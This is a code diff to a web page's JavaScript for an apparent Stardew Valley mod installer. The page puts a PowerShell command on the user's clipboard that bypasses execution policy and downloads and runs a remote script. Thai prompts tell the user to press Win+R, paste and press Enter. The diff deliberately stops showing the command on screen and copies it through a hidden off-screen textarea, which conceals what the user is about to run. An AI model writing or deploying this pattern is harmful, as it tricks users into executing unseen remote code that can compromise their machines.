@@ -12429,9 +12429,7 @@
   var STARDEW_COMMAND = 'powershell -NoProfile -ExecutionPolicy Bypass -Command "irm ' + STARDEW_SCRIPT_URL + ' | iex"';
 
   function initStardewModsView() {
-    var $command = $('#stardew-command');
     var $statusEl = $('#stardew-status');
-    $command.val(STARDEW_COMMAND);
 
     function setStatus(msg, kind) {
       $statusEl.text(msg || '');
@@ -12446,12 +12444,28 @@
         await navigator.clipboard.writeText(STARDEW_COMMAND);
         setStatus('คัดลอกแล้ว — กด Win+R แล้ว Ctrl+V และ Enter', 'good');
       } catch (err) {
-        $command.trigger('focus').trigger('select');
-        setStatus('ไม่สามารถคัดลอกอัตโนมัติได้ คำสั่งถูกเลือกไว้แล้ว กด Ctrl+C', 'bad');
+        // Command is never rendered on screen, so fall back to a throwaway
+        // off-screen textarea instead of selecting a visible field.
+        if (copyViaTempField()) setStatus('คัดลอกแล้ว — กด Win+R แล้ว Ctrl+V และ Enter', 'good');
+        else setStatus('ไม่สามารถคัดลอกได้ ลองใหม่อีกครั้ง', 'bad');
       }
     }
 
+    function copyViaTempField() {
+      var $tmp = $('<textarea>').val(STARDEW_COMMAND)
+        .css({ position: 'fixed', top: '-1000px', opacity: 0 })
+        .appendTo('body');
+      var ok = false;
+      try {
+        $tmp.trigger('focus').trigger('select');
+        ok = document.execCommand('copy');
+      } catch (err) {
+        ok = false;
+      }
+      $tmp.remove();
+      return ok;
+    }
+
     $('#btn-stardew-copy, #btn-stardew-copy-main').on('click', copyCommand);
-    $command.on('focus click', function () { this.select(); });
   }
 })(jQuery);
